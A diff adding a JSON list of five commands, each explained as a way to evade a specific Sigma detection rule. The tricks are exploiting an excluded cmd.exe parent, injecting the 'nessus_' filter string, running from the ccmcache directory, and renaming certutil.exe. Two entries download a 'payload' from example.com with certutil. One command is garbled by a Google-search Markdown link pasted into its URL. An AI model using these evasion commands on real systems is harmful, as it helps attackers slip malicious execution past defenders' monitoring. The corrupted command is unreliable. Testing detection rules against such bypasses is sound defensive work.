@@ -1,0 +1,22 @@
+[
+  {
+    "output": "cmd.exe /c nslookup.exe example.com",
+    "explanation": "The rule authors explicitly removed '\\cmd.exe' from the ParentImage selection list (noted as '# - '\\cmd.exe' # too many false positives'). Using cmd.exe as the parent process to spawn the targeted child processes completely avoids the selection criteria."
+  },
+  {
+    "output": "powershell.exe -Command \"schtasks.exe /query # \\nessus_\"",
+    "explanation": "The rule contains a broad exclusion named 'filter_nessus' that drops the alert if the CommandLine contains the string '\\nessus_'. Appending this specific string as a comment or dummy argument forces the logic to ignore the event."
+  },
+  {
+    "output": "powershell.exe -Command \"Copy-Item C:\\Windows\\System32\\certutil.exe C:\\Temp\\cu.exe; C:\\Temp\\cu.exe -urlcache -split -f [http://example.com/payload.txt](https://www.google.com/search?q=http://example.com/payload.txt) C:\\Temp\\payload.txt\"",
+    "explanation": "The detection relies on statically matching the end of the executed Image path (e.g., '\\certutil.exe'). Copying the native binary to a different name before execution breaks the 'Image|endswith' logic."
+  },
+  {
+    "output": "powershell.exe -Command \"Set-Location C:\\ccmcache\\; schtasks.exe /query\"",
+    "explanation": "The rule includes an exclusion 'filter_ccmcache' which suppresses the alert if the CurrentDirectory contains '\\ccmcache\\'. Executing the suspicious child process from within this working directory will bypass the rule."
+  },
+  {
+    "output": "cmd.exe /c certutil.exe -urlcache -split -f http://example.com/test.txt test.txt",
+    "explanation": "Bypass by parent process selection: The Sigma rule explicitly comments out '\\cmd.exe' from the ParentImage list to reduce false positives. Spawning a targeted child process (like certutil.exe) directly from cmd.exe evades this rule."
+  }
+]
